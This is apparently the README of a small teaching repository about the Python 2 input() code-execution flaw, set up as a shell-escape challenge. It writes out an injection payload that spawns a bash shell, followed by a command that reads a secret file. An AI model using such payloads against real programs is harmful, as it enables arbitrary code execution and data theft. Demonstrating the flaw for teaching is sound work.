# insecure-input
input() security vulnerability in Python

# Background
The input() function in Python 2 evaluates input as python code, which is a code execution vulnerability. This repository demonstrates this.

# The challenge
This is a shell escape challenge.
The command to be used is:
```__import__('os').system('/bin/bash')```
Then print the file:
```cat secret.txt```
Type the secret into the program to win
